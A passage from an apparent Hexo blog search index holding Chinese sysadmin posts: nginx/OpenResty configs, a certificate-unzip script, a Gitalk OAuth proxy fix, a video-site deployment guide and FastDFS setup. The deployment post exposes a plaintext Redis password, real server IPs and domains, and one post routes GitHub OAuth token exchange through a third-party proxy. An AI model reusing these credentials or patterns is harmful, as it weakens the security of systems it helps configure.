#这是一个横向扩展配置，前期可能只有一个集群group1,当group1满后，只需将上传指向group2, #也就是将rewrite , proxy_pass 中的group1改为group2即可。 proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; rewrite ^/godfs/upload /group1/upload break; proxy_pass http://gofastdfs-group1; } location ~ /godfs/big/upload { #以上上类似。 proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; rewrite ^/godfs/upload /group1/big/upload break; proxy_pass http://gofastdfs-group1; } }}","link":"/2020/08/05/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BAgo-fastdfs/"},{"title":"一键解压证书脚本","text":"1.创建一个目录， mkdir /root/1键解压证书 vim jieya.sh 脚本内容 把证书上传到1键解压证书里面， 公司证书目录不一样，对应修改的脚本内容就可以。 1234567891011121314151617181920212223242526272829#!/bin/bash#author anan###脚本和nginx .zip结尾证书压缩包放在同一目录下即可script_dir=$(cd $(dirname \"$0\") &amp;&amp; pwd)for i in ${script_dir}/*.zip;dounzip $izip=([1]=`ls ${script_dir}/|egrep '(_chain.crt)'` [2]=`ls ${script_dir}/|egrep '(_key.key)'`)name=([1]=`echo ${zip[1]}` [2]=`echo ${zip[2]}`)file=([1]=`echo ${name[1]%_*}` [2]=`echo ${name[2]%_*}`)#截取域名把_后面的内容去掉，只输出前面的域名mkdir -p /etc/nginx/conf/域名证书/${file[1]}/Nginxmv ${script_dir}/${name[1]} /etc/nginx/conf/域名证书/${file[1]}/Nginx/${file[1]}.nginx.crtmv ${script_dir}/${name[2]} /etc/nginx/conf/域名证书/${file[2]}/Nginx/${file[2]}.keyrm -rf ${script_dir}/$idonerm -rf ${script_dir}/*.zip 优化版本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/bin/bash#author anan###脚本和nginx .zip结尾证书压缩包放在同一目录下即可script_dir=$(cd $(dirname &quot;$0&quot;) &amp;&amp; pwd)for i in ${script_dir}/*.zip;dounzip $izip=( `ls ${script_dir}/|egrep '(_chain.crt)'|cut -c 1-4` `ls ${script_dir}/|egrep '(_key.key)'|cut -c 1-4` `ls ${script_dir}/|egrep '(_chain.crt)'` `ls ${script_dir}/|egrep '(_key.key)'`)name=( `ls ${script_dir}/|egrep '(_chain.crt)'|cut -c 5-999` `ls ${script_dir}/|egrep '(_key.key)'|cut -c 5-999`) if [ ${zip[0]} == 'www.' ];then mv ${script_dir}/${zip[2]} ${script_dir}/${name[0]} mv ${script_dir}/${zip[3]} ${script_dir}/${name[1]} rm -rf ${script_dir}/www.*fifile=( `ls ${script_dir}/|egrep '(_chain.crt)'` `ls ${script_dir}/|egrep '(_key.key)'`)filename=`echo ${file[0]%_*}`mkdir -p /etc/nginx/conf/域名证书/${filename}/Nginxmv ${script_dir}/${file[0]} /etc/nginx/conf/域名证书/${filename}/Nginx/${filename}.nginx.crtmv ${script_dir}/${file[1]} /etc/nginx/conf/域名证书/${filename}/Nginx/${filename}.keyrm -rf ${script_dir}/$idonerm -rf ${script_dir}/*.zip","link":"/2020/08/04/%E8%A7%A3%E5%8E%8B%E8%AF%81%E4%B9%A6/"},{"title":"解决Gitalk评论系统报403问题","text":"解决Gitalk评论系统报403问题。最近使用 gitalk 在登录 gitlab 授权时出现错误 error: request failed with status code 403。 这是因为 gitalk 在访问 github 时为了解决跨域问题使用了一个反向代理，这个默认的反向代理近期限制了访问，所以无法使用了。 查阅了一些资料后发现不少大佬使用更换代理地址的方式来解决问题： 这次直接去嫖了一个 CORS proxy, 把 gitalk.js 的 6794 行改为 proxy: ‘https://netnr-proxy.cloudno.de/https://github.com/login/oauth/access_token‘, 就可以了。具体能用多久也不清楚，且用且珍惜。 但将自己网站的服务依赖于第三方，也不是长久之计，我们为什么不自行搭建一个反向代理来自己使用呢。 解决方案我们可以使用 nginx 简单的配置一下，即可达到反向代理请求 github 的目的。 配置 nginx 添加以下内容到第一个 location 前面： 123location = /login/oauth/access_token { proxy_pass https://github.com;} 如果你使用了其他的域名(例如我的网站地址是https://www.xgg.cool，我将反向代理配置到了另外一个网站上https://static.appgao.cate.fun，就需要解决跨域问题)，则使用下面配置。 123456789location = /login/oauth/access_token { add_header Access-Control-Allow-Origin 'https://www.xgg.cool'; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS'; add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'; if ($request_method = 'OPTIONS') { return 204; } proxy_pass https://github.com;} 我将反向代理部署到了 https://static.appgao.cate.fun 这个网站上（其他网站无法使用，因为我配置了 Access-Control-Allow-Origin https://www.xgg.cool），然后我需要在 gitalk 中添加以下内容： 1proxy: 'https://static.appgao.cate.fun/login/oauth/access_token' 请看下面我的最终配置 最后配置好后重新部署下就行了。hexo g 然后 hexo d推送到远端。 测试效果现在又可以愉快的评论了，你可以访问这个页面来测试效果： https://yc6.cool/self-talking/","link":"/2023/02/07/%E8%A7%A3%E5%86%B3Gitalk%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E6%8A%A5403%E9%97%AE%E9%A2%98/"},{"title":"视频系统架构搭建文档","text":"视频系统架构搭建文档工作中部署视频电影架构。写个文档记录下。按照最低部署，后期流量上去了对应扩容就行 架构需要准备5台服务器，我用的微软云服务器 分别是 1台网关服务器，微软内网ip 172.19.16.10 1台部署Jar包服务器，微软内网ip 172.19.0.10 1台数据库服务器，微软内网ip 172.19.0.14 1台视频存储服务器 线下机房公网ip 142.4.10.65 1台图片存储服务器。 微软内网ip 172.19.16.15 如果需要开启app下载功能。还得部署一台视频下载服务器。 架构工作流程，APP视频软件通过app访问域名(网关服务器)，进入到，==》Jar服务器，通过Jar包接口配置的数据库接口进行查询。包括对应的视频播放地址，和图片存放地址。 相关对应的域名: 网关域名 txdy78.tv 播放域名 fybofang.com 图片域名 txtupian.com 视频分享域名 txfx.tv 视频系统后台管理域名 txadminav.com 1. 部署网关服务器首先基础的linux相关环境搭建好。我这里主要写下nginx相关配置文档 1234567891011121314151617181920212223242526272829303132333435363738#我设置的配置文件目录 ls查看/software/站点配置文件db gateway-common gateway.conf share.conf sslcat gateway.conf limit_req_zone $binary_remote_addr zone=mylimit:100m rate=1r/s;# 后端jar服务器地址接口upstream bg-admin1 { server 172.19.0.10:8081; #server 10.170.15.220:8081; 后期需要加负载直接添加就行}upstream bg-app1 { server 172.19.0.10:8082; #server 10.170.15.220:8082;}server { listen 80; server_name txdy78.tv www.txdy78.tv; # 具体代理配置 include /software/站点配置文件/gateway-common/common.conf;}server { listen 888 ssl http2; server_name txdy78.tv www.txdy78.tv; # SSL ssl_certificate /software/域名证书/txdy78.tv/txdy78.tv_chain.crt; ssl_certificate_key /software/域名证书/txdy78.tv/txdy78.tv_key.key; # security include /software/站点配置文件/ssl/ssl.conf; # 具体代理配置 include /software/站点配置文件/gateway-common/common.conf;} gateway-common/common.conf 配置内容 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879 cat gateway-common/common.conf # . fileslocation ~ /\\.(?!well-known) { deny all;}# favicon.icolocation = /favicon.ico { log_not_found off; access_log off;}# restrict methodsif ($request_method !~ ^(GET|POST|PUT|PATCH|DELETE|HEAD|CONNECT|OPTIONS|TRACE)$) { return '405';}# CORSlocation / { add_header Access-Control-Allow-Origin '*'; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS'; add_header Access-Control-Allow-Headers 'content-type,token,version,DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'; if ($request_method = 'OPTIONS') { return 204; }}location =/ { default_type text/plain; echo \"ok\";}# 后台管理location /videomanager { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_connect_timeout 300; proxy_http_version 1.1; proxy_set_header Connection \"\"; proxy_pass http://bg-admin1; proxy_next_upstream error timeout http_500 http_502 http_503 http_504 non_idempotent;}# 支付接口服务器location /videosite/pay/ { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_connect_timeout 300; proxy_http_version 1.1; proxy_set_header Connection \"\"; proxy_pass http://43.154.58.46:8082; #支付接口服务器}# 限流location /videosite/video/get/play-info { limit_req zone=mylimit burst=5 nodelay; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_connect_timeout 300; proxy_http_version 1.1; proxy_set_header Connection \"\"; proxy_pass http://bg-app1; proxy_next_upstream error timeout http_500 http_502 http_503 http_504 non_idempotent;}# APP后台location /videosite { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://bg-app1; proxy_connect_timeout 300; proxy_http_version 1.1; proxy_set_header Connection \"\"; proxy_next_upstream error timeout http_500 http_502 http_503 http_504 non_idempotent;} ssl/ssl.conf配置内容 里面的/etc/nginx/conf/dhparam.pem 文件直接本地通过命令生成即可 12345678910111213141516171819202122232425262728293031323334openssl dhparam -out /etc/nginx/conf/dhparam.pem 2048 #生成dhparam.pem文件cat ssl/ssl.conf # SSLssl_session_timeout 1d;ssl_session_cache shared:SSL:10m;ssl_session_tickets off;# Diffie-Hellman parameter for DHE ciphersuitesssl_dhparam /etc/nginx/conf/dhparam.pem;# Mozilla Intermediate configurationssl_protocols TLSv1.2 TLSv1.3;ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;# OCSP Staplingssl_stapling on;ssl_stapling_verify on;resolver 1.1.1.1 1.0.0.1 8.8.8.8 8.8.4.4 208.67.222.222 208.67.220.220 valid=60s;resolver_timeout 2s;# security headersadd_header X-XSS-Protection \"1; mode=block\" always;add_header X-Content-Type-Options \"nosniff\" always;add_header Referrer-Policy \"no-referrer-when-downgrade\" always;add_header Content-Security-Policy \"default-src 'self' http: https: data: blob: 'unsafe-inline'; frame-ancestors 'self';\" always;add_header Permissions-Policy \"interest-cohort=()\" always;# HSTS#add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;# . fileslocation ~ /\\.(?!well-known) { deny all;} db/db.conf配置内容 1234567891011121314151617181920212223242526272829303132stream { # Logging log_format main '[$time_local] $protocol $remote_addr ' '$status $bytes_sent $bytes_received ' '$session_time &quot;$upstream_addr&quot; &quot;$upstream_bytes_sent&quot; ' '&quot;$upstream_bytes_received&quot; &quot;$upstream_connect_time&quot;'; access_log logs/tcp-access.log main; error_log logs/tcp-error.log; upstream mysql { server 172.19.0.14:3368 weight=1; } upstream redis { server 172.19.0.14:6380 weight=1; } server { listen 3368; proxy_connect_timeout 3s; proxy_pass mysql; } server { listen 6380; proxy_connect_timeout 3s; proxy_pass redis; }} share.conf 分享域名配置文件内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 cat share.conf server { listen 80; server_name txfx.tv www.txfx.tv; location / { return 301 https://txfx.tv:88$request_uri; }}server { listen 443 ssl http2; listen 88 ssl http2; server_name txfx.tv www.txfx.tv; root /software/share; default_type text/html; # SSL ssl_certificate /software/域名证书/txfx.tv/txfx.tv_chain.crt; ssl_certificate_key /software/域名证书/txfx.tv/txfx.tv_key.key; # security include /software/站点配置文件/ssl/ssl.conf; # index.html fallback location / { try_files $uri $uri/ /proc.html?u=$uri; } location /redirect { content_by_lua_block { if not ngx.var.arg_u then ngx.redirect(\"/\"); end local http = require \"resty.http\"; local httpc = http.new(); local res, err = httpc:request_uri(\"http://txdy78.tv/videosite/short-link/getShortLink2/\"..ngx.var.arg_u); if not res then ngx.log(ngx.ERR, \"not res:\" .. err); ngx.exit(ngx.ERROR); end if 200 ~= res.status then ngx.exit(res.status); end local json = require(\"cjson.safe\"); local t = json.decode(res.body); if not t or t.data == json.null or not t.data.longs then ngx.exit(404); end ngx.redirect(\"https://tx888.tv/?\"..t.data.longs); } }} 分享家目录内容 /software/share 1234ls /software/share/index.html proc.html qq.html wx.html里面的具体内容请参考我另外的文章https://yc6.cool/2021/07/31/nginx%E5%88%A4%E6%96%AD%E5%BE%AE%E4%BF%A1%E7%AB%AF%E8%B7%B3%E8%BD%AC%E4%B8%8D%E5%90%8C%E9%A1%B5%E9%9D%A2/ 2. 部署Jar服务器。这台服务器首先需要部署docker环境以及docker-compose 基础搭建环境我这里就不详细写文档了。主要写下部署文件 1234567891011121314151617181920212223242526272829303132vim docker-compose.yml version: \"3\"services: site: build: ./video_site container_name: video_site tty: true restart: always network_mode: \"host\" volumes: - /etc/localtime:/etc/localtime - /var/log/video-box:/var/log/video-box logging: driver: \"json-file\" options: max-file: \"20\" max-size: \"10G\" manager: build: ./video_manager container_name: video_manager tty: true restart: always network_mode: \"host\" volumes: - /etc/localtime:/etc/localtime - /var/log/video-box:/var/log/video-box logging: driver: \"json-file\" options: max-file: \"20\" max-size: \"10G\" 部署运行命令 12docker-compose up -d --build #运行docker-compose down #停止 视频系统的后台管理也是部署这台。配文件内容是 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384 cat manager.conf # txadminav.comserver { listen 443 ssl http2; server_name txadminav.com; root /software/admin; # SSL ssl_certificate /software/域名证书/txadminav.com/txadminav.com_chain.crt; ssl_certificate_key /software/域名证书/txadminav.com/txadminav.com_key.key; # security headers add_header X-XSS-Protection \"1; mode=block\" always; add_header X-Content-Type-Options \"nosniff\" always; add_header Referrer-Policy \"no-referrer-when-downgrade\" always; add_header Content-Security-Policy \"default-src 'self' http: https: data: blob: 'unsafe-inline'; frame-ancestors 'self';\" always; add_header Permissions-Policy \"interest-cohort=()\" always; add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always; # . files location ~ /\\.(?!well-known) { deny all; } # index.html fallback location / { try_files $uri $uri/ /index.html; } # reverse proxy location /apis/ { proxy_pass http://www.txdy78.tv/; proxy_http_version 1.1; proxy_cache_bypass $http_upgrade; # Proxy headers proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $connection_upgrade; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Forwarded $proxy_add_forwarded; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-Host $host; proxy_set_header X-Forwarded-Port $server_port; # Proxy timeouts proxy_connect_timeout 60s; proxy_send_timeout 60s; proxy_read_timeout 120s; } # favicon.ico location = /favicon.ico { log_not_found off; access_log off; } # robots.txt location = /robots.txt { log_not_found off; access_log off; } # assets, media location ~* \\.(?:css(\\.map)?|js(\\.map)?|jpe?g|png|gif|ico|cur|heic|webp|tiff?|mp3|m4a|aac|ogg|midi?|wav|mp4|mov|webm|mpe?g|avi|ogv|flv|wmv)$ { expires 7d; access_log off; } # svg, fonts location ~* \\.(?:svgz?|ttf|ttc|otf|eot|woff2?)$ { add_header Access-Control-Allow-Origin \"*\"; expires 7d; access_log off; }}# HTTP redirectserver { listen 80; server_name txadminav.com; return 301 https://txadminav.com$request_uri;} 3. 数据库服务器部署首先也是搭建好docker环境，redis数据库通过docker部署就行了 12docker run --name redis --restart=unless-stopped -v /etc/localtime:/etc/localtime:ro -v redis-data:/data -v redis-conf:/etc/redis -p 6380:6379 -d redis:6.2.6 redis-server --appendonly yes --requirepass \"wuji..!@#redis..#@!abc\" mysql数据直接在服务器搭建就好了。具体搭建文档请参考我之前的文章 12#文章地址https://yc6.cool/2020/08/03/mysql%E5%9F%BA%E7%A1%80/ 4. 部署视频存储系统和图片存储系统部署这两台服务器。我都是通过fdfs文件系统部署的。 12具体部署的详细步骤，参考我以前的文章https://yc6.cool/2020/08/04/FastdFS%E9%83%A8%E7%BD%B2%E8%AF%A6%E8%A7%A3/ 下面是更新后的fdfs部署文档 FastDFS部署一、安装依赖1yum install git gcc gcc-c++ make automake autoconf libtool pcre pcre-devel zlib zlib-devel openssl-devel wget vim ncurses-devel libevent-devel -y 二、安装FastDFS123456789101112131415161718192021mkdir /data/fdfs/{storage,client,tracker}/{data,logs} -pmkdir /fdfscd /fdfsgit clone https://github.com/happyfish100/fastdfsgit clone https://github.com/happyfish100/libfastcommoncd /fdfs/libfastcommon ./make.sh &amp;&amp; ./make.sh installcd /fdfs/fastdfs./make.sh &amp;&amp; ./make.sh install./setup.sh /etc/fdfs/systemctl daemon-reload 1、配置Tracker 编辑配置文件 vim /etc/fdfs/tracker.conf 123base_path=/home/yuqing/fastdfs # 基础路径 修改为/data/fdfs/trackerreserved_storage_space = 20% # storage保留空间 修改为0.1%use_storage_id = false # 指定storage 改为true 修改storage_ids.conf vim /etc/fdfs/storage_ids.conf 12345678910111213141516# &lt;id&gt; &lt;group_name&gt; &lt;ip_or_hostname[:port]&gt;## id is a natural number (1, 2, 3 etc.),# 6 bits of the id length is enough, such as 100001## storage ip or hostname can be dual IPs seperated by comma,# one is an inner (intranet) IP and another is an outer (extranet) IP,# or two different types of inner (intranet) IPs# for example: 192.168.2.100,122.244.141.46# another eg.: 192.168.1.10,172.17.4.21## the port is optional. if you run more than one storaged instances# in a server, you must specified the port to distinguish different instances.100001 group1 116.202.174.78 # 修改为指定storage的ip100002 group1 192.168.0.197 配置开机自启 systemctl enable fdfs_trackerd 启动trakcer systemctl start fdfs_trackerd 查看tracker日志 tailf /data/fdfs/tracker/logs/trackerd.log 配置openresty 1234567891011121314151617181920212223mkdir /software/站点配置文件/ -pcat &lt;&lt;EOF &gt;/software/站点配置文件/fdfs.confupstream fdfs_group1 { # 修改为对应storage server 47.56.185.141:8888 weight=1 max_fails=2 fail_timeout=30s;}server { listen 80; server_name 47.75.70.29; # 修改为对应值 add_header Access-Control-Allow-Origin *; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS'; add_header Access-Control-Allow-Headers 'content-type,token,version,DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'; if (\\$request_method = 'OPTIONS') { return 204; } location /group1/M00 { proxy_next_upstream http_502 http_504 error timeout invalid_header; proxy_pass http://fdfs_group1; expires 30d; }}EOFopenresty -s reload 2、配置Storage 编辑配置文件 vim /etc/fdfs/storage.conf 主要配置以下几项 12345group_name=group1 # 组名base_path=/home/yuqing/fastdfs # 基础路径 修改为/data/fdfs/storagestore_path0=/home/yuqing/fastdfs # 存储路径 修改为/data/fdfs/storagetracker_server=192.168.209.121:22122 # tracker地址 修改为对应地址tracker_server=192.168.209.122:22122 # 若单tracker 可注释 编译安装openresty及fastdfs-nginx-module 123456789101112131415161718192021cd /fdfsgit clone https://github.com/happyfish100/fastdfs-nginx-modulegit clone https://github.com/google/ngx_brotlicd ngx_brotli &amp;&amp; git submodule update --initcd /fdfswget https://openresty.org/download/openresty-1.19.9.1.tar.gztar xf openresty-1.19.9.1.tar.gzcd openresty-1.19.9.1/./configure --prefix=/usr/local/openresty --with-pcre-jit --with-stream --with-stream_ssl_module --with-stream_ssl_preread_module --with-http_v2_module --without-mail_pop3_module --without-mail_imap_module --without-mail_smtp_module --with-http_stub_status_module --with-http_realip_module --with-http_addition_module --with-http_auth_request_module --with-http_secure_link_module --with-http_random_index_module --with-http_gzip_static_module --with-http_sub_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gunzip_module --with-threads --with-http_ssl_module --with-compat --add-module=/fdfs/fastdfs-nginx-module/src --add-module=/fdfs/ngx_brotligmake &amp;&amp; gmake installsystemctl restart openresty 配置开机自启 systemctl enable fdfs_storaged 启动storage systemctl start fdfs_storaged 查看storage日志 tailf /data/fdfs/storage/logs/storaged.log 配置mod_fastdfs.conf cp /fdfs/fastdfs-nginx-module/src/mod_fastdfs.conf /etc/fdfs/ vim /etc/fdfs/mod_fastdfs.conf 主要配置以下几项 12345tracker_server=tracker:22122 # tracker地址 修改为对应地址group_name=group1 # 组名url_have_group_name = false # url是否包含组名 修改为truestore_path0=/home/yuqing/fastdfs # storage存储路径 修改为/data/fdfs/storageresponse_mode=proxy # 同步未完成时响应模式 修改为redirect 修改mime.types 12video/mp2t tsapplication/vnd.apple.mpegurl m3u8 配置openresty 1234567891011mkdir /software/站点配置文件/ -pcat &lt;&lt;EOF &gt;/software/站点配置文件/fdfs.confserver { listen 8888; server_name 47.56.185.141; # 此处进行对应修改 location /group1/M00 { ngx_fastdfs_module; }}EOFopenresty -s reload 3、配置clientvim /etc/fdfs/client.conf 主要配置以下几项 123base_path=/home/yuqing/fastdfs # 基础路径 修改为/data/fdfs/clienttracker_server=192.168.209.121:22122 # tracker地址 修改为对应地址tracker_server=192.168.209.122:22122 # 若单tracker 可注释 三、测试1、查看FastDFS集群状态fdfs_monitor /etc/fdfs/client.conf 2、上传文件测试12[root@Tracker ~]$ fdfs_upload_file /etc/fdfs/client.conf /fdfs/fastdfs/README_zh.md group1/M00/00/00/Lzi5jV3hBsGAB4RaAAAGpOD9zYI2054.md 若返回 fid 则上传成功 3、文件访问测试使用浏览器访问http://&lt;storage ip&gt;:8888/group1/M00/00/00/Lzi5jV3hBsGAB4RaAAAGpOD9zYI2054.md若能正常下载，即集群正常工作。 视频存储服务器搭建好后交给专门上传视频的人员进行上传。","link":"/2022/01/23/%E8%A7%86%E9%A2%91%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E6%90%AD%E5%BB%BA%E6%96%87%E6%A1%A3/"},{"title":"比较炫的自定义css","text":"各种handsome主题改动集合1.比较炫的自定义css 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154*首页文章版式圆角化*/.panel{ border: none; border-radius: 15px;}.panel-small{ border: none; border-radius: 15px;}.item-thumb{ border-radius: 15px; }/*首页文章图片获取焦点放大*/.item-thumb{ cursor: pointer; transition: all 0.6s; }.item-thumb:hover{ transform: scale(1.05); }.item-thumb-small{ cursor: pointer; transition: all 0.6s;}.item-thumb-small:hover{ transform: scale(1.05);}/*首页头像自动旋转*/.thumb-lg{ width:66px;}.avatar{ -webkit-transition: 0.4s; -webkit-transition: -webkit-transform 0.4s ease-out; transition: transform 0.4s ease-out; -moz-transition: -moz-transform 0.4s ease-out; }.avatar:hover{ transform: rotateZ(360deg); -webkit-transform: rotateZ(360deg); -moz-transform: rotateZ(360deg);}#aside-user span.avatar{ animation-timing-function:cubic-bezier(0,0,.07,1)!important; border:0 solid}#aside-user span.avatar:hover{ transform:rotate(360deg) scale(1.2); border-width:5px; animation:avatar .5s}/*首页头像放大并自动旋转.thumb-lg{ width:66px;}@-webkit-keyframes rotation{ from { -webkit-transform: rotate(0deg); } to { -webkit-transform: rotate(360deg); }}.img-full{ -webkit-transform: rotate(360deg); animation: rotation 3s linear infinite; -moz-animation: rotation 3s linear infinite; -webkit-animation: rotation 3s linear infinite; -o-animation: rotation 3s linear infinite;}/*文章标题居中*/.panel h2{ text-align: center; }.post-item-foot-icon{ text-align: center;}*//*panel阴影*/.panel{ box-shadow: 1px 1px 5px 5px rgba(255, 112, 173, 0.35); -moz-box-shadow: 1px 1px 5px 5px rgba(255, 112, 173, 0.35);}.panel:hover{ box-shadow: 1px 1px 5px 5px rgba(255, 112, 173, 0.35); -moz-box-shadow: 1px 1px 5px 5px rgba(255, 112, 173, 0.35);}.panel-small{ box-shadow: 1px 1px 5px 5px rgba(255, 112, 173, 0.35); -moz-box-shadow: 1px 1px 5px 5px rgba(255, 112, 173, 0.35);}.panel-small:hover{ box-shadow: 1px 1px 5px 5px rgba(255, 112, 173, 0.35); -moz-box-shadow: 1px 1px 5px 5px rgba(255, 112, 173, 0.35);}/*如果也想使盒子四周也有阴影，加上以下代码*/.app.container { box-shadow: 0 0 30px rgba(255, 112, 173, 0.35);}/*定义滚动条高宽及背景 高宽分别对应横竖滚动条的尺寸*/::-webkit-scrollbar{ width: 3px; height: 16px; background-color: rgba(255,255,255,0);} /*定义滚动条轨道 内阴影+圆角*/::-webkit-scrollbar-track{ -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3); border-radius: 10px; background-color: rgba(255,255,255,0);} /*定义滑块 内阴影+圆角*/::-webkit-scrollbar-thumb{ border-radius: 10px; -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3); background-color: #555;}/*文章内打赏图标跳动*/.btn-pay { animation: star 0.5s ease-in-out infinite alternate;}@keyframes star { from { transform: scale(1); } to { transform: scale(1.1); }} 2.qq链接1234&lt;div style=&quot;border:0px black solid;text-align:right&quot;&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://sighttp.qq.com/authd?IDKEY=7d3cffa8a4fe2045d40496043a0f5525b61d8a5006bc7dde&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;https://wohenliu.com/tupian/tubiao/3动timg.gif&quot; alt=&quot;点击这里给我发消息&quot; title=&quot;点击这里给我发消息&quot;/&gt;&lt;/a&gt; &lt;/div&gt;QQ链接 3.9、鼠标点击特效将以下代码放在主题的handsome/component/footer.php中的之前即可。 123456789101112131415161718192021222324252627282930&lt;script type=&quot;text/javascript&quot;&gt; /* 鼠标特效 */var a_idx = 0; jQuery(document).ready(function($) { $(&quot;body&quot;).click(function(e) { var a = new Array(&quot;富强&quot;, &quot;民主&quot;, &quot;文明&quot;, &quot;和谐&quot;, &quot;自由&quot;, &quot;平等&quot;, &quot;公正&quot; ,&quot;法治&quot;, &quot;爱国&quot;, &quot;敬业&quot;, &quot;诚信&quot;, &quot;友善&quot;); var $i = $(&quot;&lt;span/&gt;&quot;).text(a[a_idx]); a_idx = (a_idx + 1) % a.length; var x = e.pageX, y = e.pageY; $i.css({ &quot;z-index&quot;: 999999999999999999999999999999999999999999999999999999999999999999999, &quot;top&quot;: y - 20, &quot;left&quot;: x, &quot;position&quot;: &quot;absolute&quot;, &quot;font-weight&quot;: &quot;bold&quot;, &quot;color&quot;: &quot;#ff6651&quot; }); $(&quot;body&quot;).append($i); $i.animate({ &quot;top&quot;: y - 180, &quot;opacity&quot;: 0 }, 1500, function() { $i.remove(); }); }); }); &lt;/script&gt; 4.评论框特效下载特效JS文件：commentTyping.js，将其放在网站目录某个地方，然后编辑主题文件handsome/component/footer.php，在后面添加以下代码。 1&lt;script type=&quot;text/javascript&quot; src=&quot;(JS文件路径)&quot;&gt;&lt;/script&gt; 5.typecho下的彩色标签云实现方式修改的有3个文件 component/sidebar.php 新增CSS文件 component/header.php &lt; 一 &gt; 用以下这段代码替换原有非文章页面的标签云 12345678910111213141516vim handsome/component/sidebar.php&lt;section id=&quot;tag_cloud-2&quot; class=&quot;widget widget_tag_cloud wrapper-md clear&quot;&gt; &lt;h3 id=&quot;tag-cloud-title&quot; class=&quot;widget-title m-t-none text-md&quot;&gt;&lt;?php _me(&quot;标签云&quot;) ?&gt;&lt;/h3&gt; &lt;div class=&quot;tags l-h-2x&quot;&gt; &lt;?php Typecho_Widget::widget('Widget_Metas_Tag_Cloud','ignoreZeroCount=1&amp;limit=30')-&gt;to($tags); ?&gt; &lt;?php if($tags-&gt;have()): ?&gt; &lt;?php while ($tags-&gt;next()): ?&gt; &lt;span id=&quot;tag-clould-color&quot; style=&quot;background-color:rgb(&lt;?php echo(rand(0,255)); ?&gt;,&lt;?php echo(rand(0,255)); ?&gt;,&lt;?php echo(rand(0,255)); ?&gt;)&quot;&gt; &lt;a href=&quot;&lt;?php $tags-&gt;permalink();?&gt;&quot; title=&quot;&lt;?php echo sprintf(_mt(&quot;该标签下有 %d 篇文章&quot;),$tags-&gt;count); ?&gt;&quot; data-toggle=&quot;tooltip&quot; &gt; &lt;?php $tags-&gt;name(); ?&gt;&lt;/a&gt; &lt;/span&gt; &lt;?php endwhile; ?&gt; &lt;?php endif; ?&gt; &lt;/div&gt; &lt;/section&gt; &lt; 二 &gt; 新增CSS文件 文件名只要不是中文 都可以，放到handsome/assets/css/目录下 123456789101112pwd/data/app/typecho/usr/themesvim handsome/assets/css/biaoqian.css/* tag-clould-color 彩色标签云 */#tag-clould-color { padding: 3px 10px 3px 10px; border-radius: 10px; color: #FFFFFF; margin: 3px 3px 3px 0; display: inline-block;} &lt; 三 &gt; 在header中引入文件 这步不做也行，不过这样的标签云样式没那么好，颜色还是有的。 1234 vim handsome/component/header.php &lt;link rel=&quot;stylesheet&quot; href=&quot;&lt;?php echo STATIC_PATH; ?&gt;css/你的CSS文件名.css&quot; type=&quot;text/css&quot;&gt; 6.给typecho加上心知天气-博客美化把代码加入到后台设置的自定义Javascript 里面 或者将代码添加到/usr/themes/handsome/component/headnav.php第48行下方即可 123456789101112131415161718192021&lt;!-- 心知天气--&gt; &lt;div id=&quot;tp-weather-widget&quot; class=&quot;navbar-form navbar-form-sm navbar-left shift&quot;&gt;&lt;/div&gt;&lt;script&gt;(function(T,h,i,n,k,P,a,g,e){g=function(){P=h.createElement(i);a=h.getElementsByTagName(i)[0];P.src=k;P.charset=&quot;utf-8&quot;;P.async=1;a.parentNode.insertBefore(P,a)};T[&quot;ThinkPageWeatherWidgetObject&quot;]=n;T[n]||(T[n]=function(){(T[n].q=T[n].q||[]).push(arguments)});T[n].l=+new 